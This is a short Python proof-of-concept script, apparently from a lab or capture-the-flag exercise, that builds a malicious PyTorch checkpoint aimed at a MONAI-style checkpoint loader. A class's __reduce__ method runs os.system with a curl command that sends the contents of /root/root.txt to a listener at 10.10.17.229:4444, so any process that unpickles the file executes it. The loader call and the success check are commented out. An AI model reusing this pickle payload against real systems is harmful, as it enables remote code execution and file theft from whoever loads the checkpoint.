import os  
import tempfile  
import json  
import torch  
from pathlib import Path  
  
class MaliciousPayload:  
    def __reduce__(self):  
        return (os.system, ('curl http://10.10.17.229:4444?data=$(cat /root/root.txt)',))  
  
def test_checkpoint_loader_attack():  

    checkpoint_file = "./malicious_checkpoint.pt"  
      

    malicious_checkpoint = {  
        'model_state_dict': MaliciousPayload(),  
        'optimizer_state_dict': {},  
        'epoch': 100  
    }  
      

    torch.save(malicious_checkpoint, checkpoint_file)  
      
     
    # from monai.handlers import CheckpointLoader  
    # import torch.nn as nn  
          
 
    # model = nn.Linear(10, 1)  
        
    # loader = CheckpointLoader(  
    #     load_path=str(checkpoint_file),  
    #     load_dict={"model": model}  
    # )  
          
    # class MockEngine:  
    #     def __init__(self):  
    #         self.state = type('State', (), {})()  
    #         self.state.max_epochs = None  
    #         self.state.epoch = 0  
          
    # engine = MockEngine()  
    # loader(engine)  
          
          
    # proof_file = "/tmp/hacker2.txt"  
    # if os.path.exists(proof_file):  
    #     print("Succes")  
    #     #os.remove(proof_file)  
    #     return True  
    # else:  
    #     print("False")  
    #     return False  
  
if __name__ == "__main__":   
    success = test_checkpoint_loader_attack()  